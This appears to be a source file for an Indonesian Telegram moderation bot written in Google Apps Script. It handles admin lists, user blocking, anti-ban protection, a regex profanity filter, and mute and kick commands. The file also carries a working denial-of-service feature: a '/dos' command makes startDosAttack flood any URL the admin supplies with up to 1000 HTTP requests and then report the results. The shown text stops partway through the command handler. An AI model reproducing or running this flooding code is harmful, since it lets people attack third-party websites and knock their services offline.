// Pastikan Anda telah menambahkan library Lumpia ke proyek Google Apps Script Anda.
// ID library Lumpia: 1Yo6vQRwjG5Gl9jeEF0g2tBTUa0XN5MyT4G_HeDpRr9DvabxhRcSdhPNj
// copy url ini https://sfl.gl/wOJmku
const BOT_TOKEN = 'BOT_TOKEN_KAMU'; // Ganti dengan token bot Anda
// copy url ini https://sfl.gl/iJ6BU
const WEBHOOK_URL = 'WEBHOOK_URL_KAMU'; // Ganti dengan URL aplikasi web Anda
// copy url ini https://sfl.gl/MHCHMRTr
const ADMIN_CHAT_IDS = [ADMIN_CHAT_ID_KAMU]; // Ganti dengan ID chat admin (bisa lebih dari satu)
const BOT_USERNAME = '@USERNAME_BOT_KAMU'; // Ganti dengan username bot Anda (misalnya, 'nama_bot')
const SPAM_BOT_USERNAME = '@SpamBot'; // Username bot Telegram untuk memblokir pengguna
const MISS_ROSE_USERNAME = '@MissRose_bot'; // Username bot Telegram Miss Rose

const userConnections = PropertiesService.getUserProperties();
const blockedUsers = PropertiesService.getUserProperties(); // Properti untuk menyimpan daftar pengguna yang diblokir
const userCommandAttempts = PropertiesService.getUserProperties(); // Properti untuk melacak percobaan perintah pengguna
const antiBanUsers = PropertiesService.getUserProperties(); // Properti untuk menyimpan daftar pengguna yang dilindungi dari ban

const MAX_ID_COMMAND_ATTEMPTS = 1; // Batas percobaan perintah /id sebelum diblokir

// Konfigurasi Admin dan Pemilik (Gunakan PropertiesService untuk penyimpanan yang lebih baik)
const adminConfig = PropertiesService.getScriptProperties();
const OWNER_ID_KEY = 'ownerId';
const ADMINS_KEY = 'admins';

function setOwnerId(ownerId, requesterId) {
  if (!isAdmin(requesterId)) {
    return 'Anda bukan admin untuk mengatur pemilik.';
  }
  adminConfig.setProperty(OWNER_ID_KEY, ownerId.toString());
  return `Pemilik bot telah diatur ke ID: <code>${ownerId}</code>`;
}

function getOwnerId() {
  return adminConfig.getProperty(OWNER_ID_KEY);
}

function addAdmin(adminId, requesterId) {
  if (!isAdmin(requesterId) && requesterId.toString() !== getOwnerId()) {
    return 'Anda tidak memiliki izin untuk menambahkan admin.';
  }
  let admins = getAdmins();
  if (!admins.includes(adminId.toString())) {
    admins.push(adminId.toString());
    adminConfig.setProperty(ADMINS_KEY, JSON.stringify(admins));
    return `Admin dengan ID <code>${adminId}</code> telah ditambahkan.`;
  }
  return `Admin dengan ID <code>${adminId}</code> sudah ada dalam daftar.`;
}

function removeAdmin(adminId, requesterId) {
  if (!isAdmin(requesterId) && requesterId.toString() !== getOwnerId()) {
    return 'Anda tidak memiliki izin untuk menghapus admin.';
  }
  let admins = getAdmins();
  const index = admins.indexOf(adminId.toString());
  if (index > -1) {
    admins.splice(index, 1);
    adminConfig.setProperty(ADMINS_KEY, JSON.stringify(admins));
    return `Admin dengan ID <code>${adminId}</code> telah dihapus.`;
  }
  return `Admin dengan ID <code>${adminId}</code> tidak ditemukan dalam daftar.`;
}

function getAdmins() {
  const admins = adminConfig.getProperty(ADMINS_KEY);
  return admins ? JSON.parse(admins) : ADMIN_CHAT_IDS.map(id => id.toString()); // Sertakan admin awal
}

function isAdmin(chatId) {
  return getAdmins().includes(chatId.toString());
}

function isOwner(chatId) {
  return chatId.toString() === getOwnerId();
}

function isProtected(userId) {
  const protectedList = antiBanUsers.getProperty('protected_list');
  return protectedList ? JSON.parse(protectedList).includes(userId.toString()) : false;
}

function protectUser(userId) {
  let protectedList = antiBanUsers.getProperty('protected_list');
  protectedList = protectedList ? JSON.parse(protectedList) : [];
  if (!protectedList.includes(userId.toString())) {
    protectedList.push(userId.toString());
    antiBanUsers.setProperty('protected_list', JSON.stringify(protectedList));
    return true;
  }
  return false;
}

function unprotectUser(userId) {
  let protectedList = antiBanUsers.getProperty('protected_list');
  if (protectedList) {
    protectedList = JSON.parse(protectedList);
    const index = protectedList.indexOf(userId.toString());
    if (index > -1) {
      protectedList.splice(index, 1);
      antiBanUsers.setProperty('protected_list', JSON.stringify(protectedList));
      return true;
    }
  }
  return false;
}

function getProtectedList(requesterId) {
  if (!isAdmin(requesterId)) {
    return 'Anda bukan admin untuk melihat daftar pengguna yang dilindungi.';
  }
  const protectedList = antiBanUsers.getProperty('protected_list');
  if (protectedList) {
    const parsedList = JSON.parse(protectedList);
    if (parsedList.length > 0) {
      return `<b>Daftar Pengguna yang Dilindungi:</b>\n<code>${parsedList.join(', ')}</code>`;
    } else {
      return 'Tidak ada pengguna yang saat ini dilindungi.';
    }
  } else {
    return 'Tidak ada pengguna yang saat ini dilindungi.';
  }
}

function isBlocked(userId) {
  const blockedList = blockedUsers.getProperty('blocked_list');
  return blockedList ? JSON.parse(blockedList).includes(userId.toString()) : false;
}

function blockUser(userId) {
  let blockedList = blockedUsers.getProperty('blocked_list');
  blockedList = blockedList ? JSON.parse(blockedList) : [];
  if (!blockedList.includes(userId.toString())) {
    blockedList.push(userId.toString());
    blockedUsers.setProperty('blocked_list', JSON.stringify(blockedList));
    return true;
  }
  return false;
}

function unblockUser(userId) {
  let blockedList = blockedUsers.getProperty('blocked_list');
  if (blockedList) {
    blockedList = JSON.parse(blockedList);
    const index = blockedList.indexOf(userId.toString());
    if (index > -1) {
      blockedList.splice(index, 1);
      blockedUsers.setProperty('blocked_list', JSON.stringify(blockedList));
      return true;
    }
  }
  return false;
}

function getBlockedList(requesterId) {
  if (!isAdmin(requesterId)) {
    return 'Anda bukan admin untuk melihat daftar blokir.';
  }
  const blockedList = blockedUsers.getProperty('blocked_list');
  if (blockedList) {
    const parsedList = JSON.parse(blockedList);
    if (parsedList.length > 0) {
      return `<b>Daftar Pengguna yang Diblokir:</b>\n<code>${parsedList.join(', ')}</code>`;
    } else {
      return 'Tidak ada pengguna yang saat ini diblokir.';
    }
  } else {
    return 'Tidak ada pengguna yang saat ini diblokir.';
  }
}
function muteUser(chatId, userId, durationInSeconds) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/restrictChatMember`;
  const unixTimestamp = Math.floor(Date.now() / 1000) + durationInSeconds;
  const data = {
    chat_id: chatId,
    user_id: userId,
    permissions: { can_send_messages: false },
    until_date: durationInSeconds ? unixTimestamp : undefined // Optional duration
  };
  const options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(data)
  };
  try {
    const response = UrlFetchApp.fetch(url, options);
    const jsonResponse = JSON.parse(response.getContentText());
    if (jsonResponse.ok) {
      Logger.log(`User ${userId} muted in ${chatId}`);
      return true;
    } else {
      Logger.error(`Failed to mute user ${userId} in ${chatId}: ${JSON.stringify(jsonResponse)}`);
      return false;
    }
  } catch (error) {
    Logger.error(`Error muting user ${userId} in ${chatId}: ${error}`);
    return false;
  }
}

function setWebhook() {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${WEBHOOK_URL}`;
  const response = UrlFetchApp.fetch(url);
  Logger.log('Set Webhook Response:', response.getContentText());
}

function deleteWebhook() {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`;
  const response = UrlFetchApp.fetch(url);
  Logger.log('Delete Webhook Response:', response.getContentText());
}

function sendTelegramAdminMessage(message) {
  ADMIN_CHAT_IDS.forEach(adminId => {
    sendMessage(adminId, message, 'HTML');
  });
}

function kickChatMember(chatId, userId) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/kickChatMember`;
  const data = {
    chat_id: chatId,
    user_id: userId,
    until_date: 0 // 0 berarti kick permanen
  };
  const options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(data)
  };
  try {
    const response = UrlFetchApp.fetch(url, options);
    const jsonResponse = JSON.parse(response.getContentText());
    if (jsonResponse.ok) {
      Logger.log(`Berhasil mengeluarkan pengguna ${userId} dari chat ${chatId}`);
      return true;
    } else {
      Logger.error(`Gagal mengeluarkan pengguna ${userId} dari chat ${chatId}: ${JSON.stringify(jsonResponse)}`);
      return false;
    }
  } catch (error) {
    Logger.error(`Error saat mencoba mengeluarkan pengguna ${userId} dari chat ${chatId}: ${error}`);
    return false;
  }
}
// --- Fungsi Anti Kata Kasar ---
function hapusPesanJikaMengandungKataKotor(chatId, messageId, text, userId, username) {
  if (!text) return false;

  // Daftar kata kasar dalam bentuk Regex (lebih fleksibel)
  const bannedWords = [
    /a[aj]+n[njz]+[i1l]+[rnŋ]+[gkc]*/i, /k[o0]+n[t+]?[o0]+l/i, /[ck][o0]+[kcq]/i, /t[e3]+mp[e3]+k/i,
    /j[e3]+mb[u]+[td]/i, /m[e3]+m[e3]+k/i, /[a4]+s[u]/i, /p[u]+k[i1l]/i, /j[a4]+nc[o0]+k/i,
    /c[u]+[o0]+k/i, /[a4]+sw[u]/i, /wu+[a4]+s[u]+/i, /k[u]+[o0]+n[t+]?[o0]+l/i, /ju+[e3]+mb[o0]+t/i,
    /u+[a4]+nj[i1l]+r/i, /m[u]+[e3]+k[i1l]+/i, /k[u]+n[t+]?[u]+l/i, /c[u]+k[i1l]+m[a4]+[iy]/i,
    /t[a4]+[i1l]/i, /t[a4]+[e3]+k/i, /j[u]+w[e3]+mb[o0]+t/i, /m[e3]+k[i1l]/i, /[a4]+j[i1l]+n[kcq]/i,
    /[a4]+nj[u]/i, /wu+[a4]+nj[a4]+[iy]/i, /[a4]+nj[a4]+[iy]/i, /b[a4]+j[i1l]+ng[a4]+n/i,
    /b[a4]+ngs[a4]+t/i, /br[e3]+ngs[e3]+k/i, /k[a4]+mpr[e3]+t/i, /t[o0]+l[o0]+l/i,
    /g[o0]+bl[o0]+[gk]/i, /b[o0]+d[o0]+h/i, /[i1l]+d[i1l]+[o0]+t/i, /d[o0]+g[o0]+/i,
    /s[e3]+t[a4]+n/i, /[i1l]+bl[i1l]+s/i, /s[i1l]+[a4]+l[a4]+n/i, /b[a4]+b[i1l]/i,
    /k[u]+r[a4]+ng\s+[a4]+j[a4]+r/i, /ng[e3]+n[t+][o0]+[td]/i, /p[e3]+l[e3]+r/i,
    /[i1l]+t[i1l]+l/i, /p[e3]+p[e3]+k/i, /p[e3]+c[u]+n/i, /f[u]+[ckq]+/i, /f[a4]+k/i,
    /s[h]+[i1l]+t/i, /b[i1l]+t[ckq]+h/i, /[a4]+ssh[o0]+l[e3]/i, /d[i1l]+[ckq]+/i,
    /p[u]+ss[yiy]+/i, /c[u]+n[t+]/i, /wh[o0]+r[e3]/i, /sl[u]+t/i, /b[a4]+st[a4]+rd/i,
    /d[a4]+m[n]/i, /h[e3]+ll/i, /k[o0]+n[t+]?l/i, /j[.]?m[.]?b[.]?t/i, /m[.]?m[.]?k/i,
    /j[.]?[a4]n[.]?c[.]?k/i, /b[.]?n[.]?g[.]?s[.]?t/i, /b[.]?j[.]?n[.]?g[.]?n/i,
    // Tambahkan kata atau pola lain jika perlu
  ];

  const textLower = text.toLowerCase().replace(/\s+/g, ''); // Hapus spasi untuk deteksi lebih baik

  for (const wordRegex of bannedWords) {
    const match = textLower.match(wordRegex);
    if (match) {
      // **Gunakan UrlFetchApp untuk menghapus pesan, bukan library eksternal**
      if (deleteMessage(chatId, messageId)) { // Panggil fungsi deleteMessage kita
        Logger.log(`Pesan ${messageId} dari user ${userId} (${username || 'no_username'}) dihapus di chat ${chatId} karena mengandung kata kasar: ${match[0]}`);
        // Kirim peringatan ke pengguna (mungkin dengan reply ke pesan asli jika memungkinkan, tapi sulit setelah dihapus)
        sendMessage(chatId, `⚠️ Pesan Anda (${messageId}) dihapus karena mengandung kata yang tidak sopan. Harap menjaga tutur kata.\nPengguna: @${username || userId}`, 'HTML');
        // Kirim notifikasi ke admin
        sendTelegramAdminMessage(
          `⚠️ Kata kasar terdeteksi & dihapus ⚠️\n` +
          `Pengguna: <code>${userId}</code> (@${username || 'no_username'})\n` +
          `Chat ID: <code>${chatId}</code>\n` +
          `Pesan ID: <code>${messageId}</code>\n` +
          `Kata Terdeteksi: <code>${match[0]}</code>\n` +
          `Pesan Asli: <code>${text}</code>` // Sertakan pesan asli untuk konteks
        );
        return true; // Berhasil dihapus, hentikan proses
      } else {
        Logger.log(`Gagal menghapus pesan ${messageId} yang mengandung kata kasar.`);
        // Mungkin kirim notifikasi ke admin bahwa penghapusan gagal
        sendTelegramAdminMessage(
          `⚠️ GAGAL HAPUS pesan kata kasar ⚠️\n` +
          `Pengguna: <code>${userId}</code> (@${username || 'no_username'})\n` +
          `Chat ID: <code>${chatId}</code>\n` +
          `Pesan ID: <code>${messageId}</code>\n` +
          `Kata Terdeteksi: <code>${match[0]}</code>\n` +
          `Pesan Asli: <code>${text}</code>`
        );
        // Pertimbangkan apakah tetap menghentikan proses atau tidak jika gagal hapus
        return false; // Gagal menghapus
      }
    }
  }
  return false; // Tidak ada kata kasar ditemukan
}
// --- Fungsi DOS (Gunakan dengan Hati-hati!) ---
function startDosAttack(chatId, urlTarget, jumlahRequest, requesterId) {
  if (!isAdmin(requesterId)) {
    sendMessage(chatId, 'Anda tidak memiliki izin untuk menggunakan perintah ini.');
    return;
  }

  const isValidUrl = /^https?:\/\/[^\s$.?#].[^\s]*$/i.test(urlTarget);
  const maxRequest = 1000; // Batas aman untuk Apps Script

  if (!isValidUrl) {
    sendMessage(chatId, 'URL tidak valid. Gunakan format: <code>/dos https://target.com [jumlah]</code>', 'HTML');
    return;
  }
  if (isNaN(jumlahRequest) || jumlahRequest <= 0 || jumlahRequest > maxRequest) {
    sendMessage(chatId, `Jumlah request tidak valid. Gunakan angka antara 1 hingga ${maxRequest}.`, 'HTML');
    return;
  }

  sendMessage(chatId, `🚀 <b>DoS Attack Dimulai</b>\nTarget: <code>${urlTarget}</code>\nJumlah Request: <code>${jumlahRequest}x</code>\nOleh: <code>${requesterId}</code>\nStatus: <i>Berjalan...</i>\n\n<i>Gunakan /stopdos untuk mencoba menghentikan.</i>`, 'HTML');
  PropertiesService.getScriptProperties().setProperty('dos_running', 'true'); // Set flag DoS berjalan
  PropertiesService.getScriptProperties().setProperty('dos_target', chatId.toString()); // Simpan chat ID target stop

  let successCount = 0;
  let failureCount = 0;

  // Jalankan loop dalam try...catch untuk menangkap error tak terduga
  try {
    for (let i = 1; i <= jumlahRequest; i++) {
      // Periksa flag stop di setiap iterasi
      if (PropertiesService.getScriptProperties().getProperty('dos_running') !== 'true') {
        Logger.log(`DoS attack dihentikan secara manual pada iterasi ${i}.`);
        sendMessage(chatId, `🛑 <b>DoS Attack Dihentikan Manual</b>\nTarget: <code>${urlTarget}</code>\nRequest Terkirim: <code>${i - 1}</code> (Sukses: ${successCount}, Gagal: ${failureCount})`, 'HTML');
        PropertiesService.getScriptProperties().deleteProperty('dos_running');
        PropertiesService.getScriptProperties().deleteProperty('dos_target');
        return; // Keluar dari loop dan fungsi
      }

      try {
        const options = {
          muteHttpExceptions: true, // Jangan hentikan skrip jika ada error HTTP
          followRedirects: true,
          validateHttpsCertificates: false // Abaikan error sertifikat (opsional, hati-hati)
        };
        const res = UrlFetchApp.fetch(urlTarget, options);
        const statusCode = res.getResponseCode();
        if (statusCode >= 200 && statusCode < 400) { // Anggap 2xx dan 3xx sukses
          successCount++;
        } else {
          failureCount++;
        }
        Logger.log(`Request ke-${i}: Status ${statusCode}`);
      } catch (err) {
        failureCount++;
        Logger.log(`Request ke-${i} gagal (exception): ${err}`);
      }

      // Beri jeda sedikit untuk mengurangi beban dan potensi blokir
      if (i % 20 === 0) { // Jeda setiap 20 request
        Utilities.sleep(500); // Jeda 0.5 detik
      } else if (i % 5 === 0) { // Jeda kecil lebih sering
        Utilities.sleep(100); // Jeda 0.1 detik
      }
    }

    // Jika loop selesai secara normal
    sendMessage(chatId, `✅ <b>DoS Attack Selesai</b>\nTarget: <code>${urlTarget}</code>\nTotal Request: <code>${jumlahRequest}</code>\nSukses: <code>${successCount}</code>\nGagal: <code>${failureCount}</code>`, 'HTML');

  } catch (e) {
    Logger.log(`Error selama eksekusi DoS loop: ${e}`);
    sendMessage(chatId, `⚠️ <b>Error terjadi saat DoS Attack</b>\nTarget: <code>${urlTarget}</code>\nError: <code>${e.message}</code>\nRequest Terkirim Sebagian: (Sukses: ${successCount}, Gagal: ${failureCount})`, 'HTML');
  } finally {
    // Selalu hapus flag setelah selesai atau error
    PropertiesService.getScriptProperties().deleteProperty('dos_running');
    PropertiesService.getScriptProperties().deleteProperty('dos_target');
  }
}
function stopDos(requesterId) {
  if (!isAdmin(requesterId)) {
    // Jika non-admin mencoba, abaikan atau kirim pesan? Abaikan saja.
    return;
  }

  const dosStatus = PropertiesService.getScriptProperties().getProperty('dos_running');
  const targetChatId = PropertiesService.getScriptProperties().getProperty('dos_target');

  if (dosStatus === 'true' && targetChatId) {
    PropertiesService.getScriptProperties().setProperty('dos_running', 'false'); // Set flag untuk menghentikan loop
    Logger.log(`Perintah /stopdos diterima dari ${requesterId}. Mencoba menghentikan DoS.`);
    sendMessage(targetChatId, `⏳ Menerima perintah /stopdos dari admin <code>${requesterId}</code>. Mencoba menghentikan proses DoS...`, 'HTML');
    // Loop DoS akan memeriksa flag ini dan berhenti pada iterasi berikutnya.
  } else {
    // Mungkin kirim pesan ke requester bahwa tidak ada DoS yang berjalan
    // Cari tahu chat ID requester jika memungkinkan untuk membalas
    // sendMessage(requesterId, 'Tidak ada perintah /dos yang terdeteksi sedang berjalan.'); // Perlu chatId requester
    Logger.log(`Perintah /stopdos dari ${requesterId} diabaikan, tidak ada DoS yang berjalan.`);
  }
}
function doPost(e) {
  try {
    const contents = JSON.parse(e.postData.contents);
    Logger.log('Webhook Received:', contents);

    if (contents.message) {
      const chatId = contents.message.chat.id;
      const userId = contents.message.from.id;
      const firstName = contents.message.from.first_name || '';
      const text = contents.message.text;
      const replyToMessage = contents.message.reply_to_message;
      const chatType = contents.message.chat.type;
      const chatUsername = contents.message.chat.username ? `@${contents.message.chat.username}` : 'Tidak ada';
      const messageId = contents.message.message_id;

      // Periksa apakah pengguna diblokir
      if (isBlocked(userId) && !isAdmin(chatId)) {
        Logger.log(`Pengguna ${userId} diblokir, pesan tidak diproses.`);
        return ContentService.createTextOutput(JSON.stringify({ "method": "post" })).setMimeType(ContentService.MimeType.JSON);
      }

      // Fitur Anti Ban Permanen (Hanya Logika di Bot Sendiri)
      if (isProtected(userId)) {
        Logger.log(`Pengguna ${userId} dilindungi dari ban.`);
        // Di sini Anda bisa menambahkan logika tambahan jika diperlukan,
        // misalnya mengirim notifikasi ke admin jika pengguna yang dilindungi mencoba perintah terlarang.
      }

      if (text === '/start') {
        if (isAdmin(chatId)) {
          let connectionInfo = 'Tidak ada koneksi tersambung.';
          const connectedList = userConnections.getProperty(`admin_${chatId}_connections`);
          if (connectedList) {
            connectionInfo = JSON.parse(connectedList).join(', ');
          }

          const reply = `<b>👋 Halo Admin ${firstName}!</b>\n\n` +
            `<b>Informasi Bot</b>\n` +
            `<b>ID Admin Anda:</b> <code>${userId}</code>\n` +
            `<b>Info Chat Saat Ini:</b>\n` +
            `  <b>ID:</b> <code>${chatId}</code>\n` +
            `  <b>Jenis:</b> <code>${chatType}</code>\n` +
            `  <b>Username Grup/Channel:</b> <code>${chatUsername}</code>\n` +
            `<b>Koneksi Tersambung Anda:</b> <code>${connectionInfo}</code>\n` +
            `<b>Username Bot:</b> <code>${BOT_USERNAME}</code>\n` +
            `<b>Pemilik Bot:</b> <code>${getOwnerId() || 'Belum diatur'}</code>`;
          sendMessage(chatId, reply, 'HTML'); // Kirim ke chat tempat perintah dipanggil
        } else {
          // Catat percobaan perintah /start oleh pengguna non-admin
          const attemptsKey = `user_${userId}_start_attempts`; // Key yang berbeda untuk /start
          let attempts = parseInt(userCommandAttempts.getProperty(attemptsKey) || '0') + 1;
          userCommandAttempts.setProperty(attemptsKey, attempts.toString());

          if (attempts >= MAX_ID_COMMAND_ATTEMPTS) { // Menggunakan batas yang sama dengan /id
            Logger.log(`Pengguna ${userId} (${chatId}) mencoba perintah /start ${attempts} kali. Memblokir dan melaporkan ke ${SPAM_BOT_USERNAME} & ${MISS_ROSE_USERNAME}.`);
            blockUser(userId);
            const reportMessage = `🚨 Penyalahgunaan Perintah /start 🚨\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/start</code> sebanyak ${attempts} kali.\nTindakan: Diblokir oleh bot. Disarankan untuk dilaporkan ke ${SPAM_BOT_USERNAME} dan ${MISS_ROSE_USERNAME}.`;
            sendTelegramAdminMessage(reportMessage);
            sendMessage(chatId, `Anda telah mencoba perintah yang tidak diizinkan terlalu banyak kali. Anda telah diblokir oleh bot.`);
            // Opsi untuk mencoba kick pengguna dari grup (jika dalam grup)
            if (chatType === 'group' || chatType === 'supergroup') {
              kickChatMember(chatId, userId);
            }
            // Tidak ada interaksi otomatis dengan @SpamBot atau @MissRose_bot.
          } else {
            let connectionInfo = 'Tidak ada koneksi tersambung.';
            const connectedList = userConnections.getProperty(`admin_${chatId}_connections`);
            if (connectedList) {
              connectionInfo = JSON.parse(connectedList).join(', ');
            }

            const reply = `<b>👋 Halo Admin ${firstName}!</b>\n\n` +
              `<b>Informasi Bot</b>\n` +
              `<b>ID Admin Anda:</b> <code>${userId}</code>\n` +
              `<b>Info Chat Saat Ini:</b>\n` +
              `  <b>ID:</b> <code>${chatId}</code>\n` +
              `  <b>Jenis:</b> <code>${chatType}</code>\n` +
              `  <b>Username Grup/Channel:</b> <code>${chatUsername}</code>\n` +
              `<b>Koneksi Tersambung Anda:</b> <code>${connectionInfo}</code>\n` +
              `<b>Username Bot:</b> <code>${BOT_USERNAME}</code>\n` +
              `<b>Pemilik Bot:</b> <code>${getOwnerId() || 'Belum diatur'}</code>`;
            sendMessage(chatId, reply, 'HTML'); // Kirim ke chat tempat perintah dipanggil
            const warningMessage = `⚠️ Percobaan Perintah /start ⚠️\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/start</code> (percobaan ke-${attempts}).`;
            Logger.log(warningMessage);
          }
        }
      } else if (text.startsWith('/setowner ') && isAdmin(chatId)) {
        const ownerIdToSet = text.substring('/setowner '.length).trim();
        const result = setOwnerId(ownerIdToSet, chatId);
        sendMessage(chatId, result, 'HTML');
      } else if (text === '/listadmin' && isAdmin(chatId)) {
        const admins = getAdmins();
        sendMessage(chatId, `<b>Daftar Admin:</b>\n<code>${admins.join(', ')}</code>`, 'HTML');
      } else if (text.startsWith('/protect ') && isAdmin(chatId)) {
        const parts = text.split(' ');
        if (parts.length === 2) {
          const target = parts[1].trim();
          let targetUserId = null;
          if (target.startsWith('@')) {
            sendMessage(chatId, `Maaf, perlindungan menggunakan username (<code>${target}</code>) tidak didukung secara langsung. Silakan gunakan ID pengguna atau balas pesan pengguna.`, 'HTML');
          } else if (!isNaN(parseInt(target))) {
            targetUserId = parseInt(target);
            if (protectUser(targetUserId)) {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> telah ditambahkan ke daftar perlindungan anti-ban.`, 'HTML');
            } else {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> sudah ada dalam daftar perlindungan anti-ban.`, 'HTML');
            }
          } else {
            sendMessage(chatId, 'Penggunaan perintah <code>/protect</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/protect [ID Pengguna]</code>.', 'HTML');
          }
        } else if (replyToMessage) {
          const targetUserId = replyToMessage.from.id;
          if (protectUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) telah ditambahkan ke daftar perlindungan anti-ban.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) sudah ada dalam daftar perlindungan anti-ban.`, 'HTML');
          }
        } else {
          sendMessage(chatId, 'Penggunaan perintah <code>/protect</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/protect [ID Pengguna]</code>.', 'HTML');
        }
      } else if (text === '/unprotect' && isAdmin(chatId)) {
        if (replyToMessage) {
          const targetUserId = replyToMessage.from.id;
          if (unprotectUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) telah dihapus dari daftar perlindungan anti-ban.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) tidak ditemukan dalam daftar perlindungan anti-ban.`, 'HTML');
          }
        } else if (text.startsWith('/unprotect ')) {
          const target = text.substring('/unprotect '.length).trim();
          if (!isNaN(parseInt(target))) {
            const targetUserId = parseInt(target);
            if (unprotectUser(targetUserId)) {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> telah dihapus dari daftar perlindungan anti-ban.`, 'HTML');
            } else {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> tidak ditemukan dalam daftar perlindungan anti-ban.`, 'HTML');
            }
          } else {
            sendMessage(chatId, 'Penggunaan perintah <code>/unprotect</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/unprotect [ID Pengguna]</code>.', 'HTML');
          }
        } else {
          sendMessage(chatId, 'Balas pesan pengguna yang ingin Anda hapus dari perlindungan atau gunakan format <code>/unprotect [ID Pengguna]</code>.', 'HTML');
        }
      } else if (text === '/listprotect' && isAdmin(chatId)) {
        const protectedListMessage = getProtectedList(chatId);
        sendMessage(chatId, protectedListMessage, 'HTML');
      } else if (text === '/id') {
        if (isAdmin(chatId)) {
          if (replyToMessage) {
            const repliedUserId = replyToMessage.from.id;
            blockUser(repliedUserId);
            sendMessage(chatId, `Pengguna dengan ID <code>${repliedUserId}</code> (mereply pesan ini) telah diblokir.`, 'HTML');
          } else {
            sendMessage(chatId, 'Balas pesan pengguna yang ingin Anda blokir dengan perintah <code>/id</code>.');
          }
        } else {
          // Catat percobaan perintah /id oleh pengguna non-admin
          const attemptsKey = `user_${userId}_id_attempts`;
          let attempts = parseInt(userCommandAttempts.getProperty(attemptsKey) || '0') + 1;
          userCommandAttempts.setProperty(attemptsKey, attempts.toString());

          if (attempts >= MAX_ID_COMMAND_ATTEMPTS) {
            Logger.log(`Pengguna ${userId} (${chatId}) mencoba perintah /id ${attempts} kali. Memblokir dan melaporkan ke ${SPAM_BOT_USERNAME} & ${MISS_ROSE_USERNAME}.`);
            blockUser(userId);
            const reportMessage = `🚨 Potensi Penyalahgunaan Perintah 🚨\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/id</code> sebanyak ${attempts} kali.\nTindakan: Diblokir oleh bot. Disarankan untuk dilaporkan ke ${SPAM_BOT_USERNAME} dan ${MISS_ROSE_USERNAME}.`;
            sendTelegramAdminMessage(reportMessage);
            sendMessage(chatId, `Anda telah mencoba perintah yang tidak diizinkan terlalu banyak kali. Anda telah diblokir oleh bot.`);
            // Opsi untuk mencoba kick pengguna dari grup (jika dalam grup)
            if (chatType === 'group' || chatType === 'supergroup') {
              kickChatMember(chatId, userId);
            }
            // Tidak ada interaksi otomatis dengan @SpamBot atau @MissRose_bot.
          } else {
            sendMessage(chatId, `Anda tidak memiliki izin untuk menggunakan perintah ini.`);
            const warningMessage = `⚠️ Percobaan Perintah Ilegal ⚠️\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/id</code> (percobaan ke-${attempts}).`;
            Logger.log(warningMessage);
          }
        }
      } else if (text.startsWith('/connect ') && isAdmin(chatId)) {
        const targets = text.substring('/connect '.length).trim().split(/\s+/);
        let connectedTargets = [];
        const existingConnections = userConnections.getProperty(`admin_${chatId}_connections`);
        if (existingConnections) {
          connectedTargets = JSON.parse(existingConnections);
        }
        targets.forEach(target => {
          if (!connectedTargets.includes(target)) {
            connectedTargets.push(target);
          }
        });
        userConnections.setProperty(`admin_${chatId}_connections`, JSON.stringify(connectedTargets));
        Logger.log(`Admin ${chatId} terhubung ke: ${connectedTargets.join(', ')}`);
        sendMessage(chatId, `Terhubung ke: <b>${connectedTargets.join(', ')}</b>.`, 'HTML');
      } else if (text === '/connection' && isAdmin(chatId)) {
        const connectedList = userConnections.getProperty(`admin_${chatId}_connections`);
        if (connectedList) {
          sendMessage(chatId, `Saat ini terhubung ke: <b>${JSON.parse(connectedList).join(', ')}</b>.`, 'HTML');
        } else {
          sendMessage(chatId, `Saat ini tidak ada koneksi yang aktif.`, 'HTML');
        }
      } else if (text === '/disconnect' && isAdmin(chatId)) {
        userConnections.deleteProperty(`admin_${chatId}_connections`);
        Logger.log(`Admin ${chatId} memutuskan semua koneksi.`);
        sendMessage(chatId, 'Semua koneksi telah diputuskan.');
      } else if (text === '/reconnect' && isAdmin(chatId)) {
        const previouslyConnected = userConnections.getProperty(`admin_${chatId}_connections`);
        if (previouslyConnected) {
          sendMessage(chatId, `Mencoba terhubung kembali ke: <b>${JSON.parse(previouslyConnected).join(', ')}</b>.`, 'HTML');
          // Anda mungkin ingin menambahkan logika di sini untuk benar-benar "melakukan sesuatu"
          // dengan koneksi yang tersimpan, misalnya mengirim pesan tes.
          // Saat ini, perintah ini hanya memberitahu admin daftar koneksi sebelumnya.
        } else {
          sendMessage(chatId, 'Tidak ada koneksi sebelumnya untuk dihubungkan kembali.');
        }
      } else if (/^-638\d+$/.test(text)) {
        sendMessage(chatId, `<code>${text}</code>`, 'HTML');
      } else if (text.startsWith('/dos ')) {
        const parts = text.split(' ');
        if (parts.length >= 3) {
          const urlTarget = parts[1];
          const jumlahRequest = parseInt(parts[2]);
          startDosAttack(chatId, urlTarget, jumlahRequest, userId);
        } else {
          sendMessage(chatId, 'Penggunaan: <code>/dos [URL] [jumlah]</code>', 'HTML');
        }
